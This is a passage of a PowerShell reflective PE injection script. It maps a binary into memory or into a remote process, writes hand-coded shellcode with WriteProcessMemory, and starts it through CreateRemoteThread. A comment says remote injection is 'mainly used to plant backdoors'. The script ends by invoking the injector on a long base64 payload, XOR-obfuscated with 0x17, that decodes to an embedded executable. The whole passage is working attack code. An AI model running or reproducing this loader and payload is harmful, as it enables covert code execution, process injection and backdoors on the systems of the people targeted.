		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = 	Get-Win32Functions
		$Win32Types = 		Get-Win32Types
		$Win32Constants =  	Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes  -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
				
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
				Write-Verbose "Calling function with WString return type"
				[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName $Func
				if ($WStringFuncAddr -eq [IntPtr]::Zero)
				{
					Throw "Couldn't find function address."
				}
				$WStringFuncDelegate = Get-DelegateType @() ([Int32])
				$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				[IntPtr]$OutputPtr = $WStringFunc.Invoke()
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	#{
    [Byte[]]$PEBytes = [System.Convert]::FromBase64String($PEBytes)
	
	for ($i = 0; $i -lt $PEBytes.Count; $i++)
	{
		$PEBytes[$i]=$PEBytes[$i] -bXOR 0x17
	}
	#[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	#}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    $PEBytes[0] = 0
    $PEBytes[1] = 0

	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $Func, $ProcId,$ForceASLR)
}

Main

}
Invoke-ReflectivePEInjection -PEBytes "Wk2HFxQXFxcTFxcX6OgXF68XFxcXFxcXVxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX5xcXFxkIrRkXox7aNq8WW9o2Q39+ZDdnZXhwZXZ6N3R2eXl4Yzd1cjdlYnk3fnk3U1hEN3p4c3I5GhodMxcXFxcXFxdJpKTIDcXKmw3FypsNxcqbnotSmwzFypsWWFSbLsXKmxZYYJuexcqbBL1ZmwjFypsNxcubb8XKmxZYYZtNxcqbFlhRmwzFypsWWFebDMXKm0V+dH8NxcqbFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXR1IXF1sWEhfd4mtNFxcXFxcXFxf3FxU2HBYdFxezFhcX8RcXFxcXF6BrFxcXBxcXF9cWFxcXFwcXBxcXFxUXFxIXFhcXFxcXEhcWFxcXFxcXpxUXFxMXFxcXFxcVFxcWFxcHFxcHFxcXFwcXFwcXFxcXFxcHFxcX9w8VFygXFxdbBhUXKxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxeHFRdnAxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxevFhUXVxcXFxcXFxcXFxcXF9cWF38WFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc5Y3JvYxcXFy9yFhcXBxcXF3EWFxcTFxcXFxcXFxcXFxcXFxc3Fxd3OWR0eHNyFxdHKxcXF5cWFxcpFxcXfRYXFxcXFxcXFxcXFxcXNxcX9zllc3ZjdhcXCE4XFxfXFhcXTRcXF78WFxcXFxcXFxcXFxcXF1cXF1c5c3ZjdhcXFzN8FxcXNxUXFycXFxcVFRcXFxcXFxcXFxcXFxdXFxfXOWVye3h0FxeLCBcXF4cVFxc3FxcXJRUXFxcXFxcXFxcXFxcXVxcXVRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX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